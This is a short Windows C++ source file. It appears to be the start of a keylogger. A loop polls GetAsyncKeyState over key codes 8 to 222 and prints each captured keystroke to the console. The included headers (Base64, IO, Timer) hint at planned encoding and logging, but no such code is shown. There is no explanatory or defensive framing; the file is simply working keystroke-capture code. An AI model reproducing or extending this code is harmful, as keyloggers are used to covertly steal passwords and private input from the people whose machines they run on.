#include <iostream>
#include <windows.h>
#include "helper.h"
#include "Base64.h"
#include "keyConstants.h"
#include "IO.h"
#include <fstream>
#include <thread>
#include "Timer.h"


int main()
{
    char c;
    while (true)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                std ::cout << c;
            }
        }
    }
    return 0;
}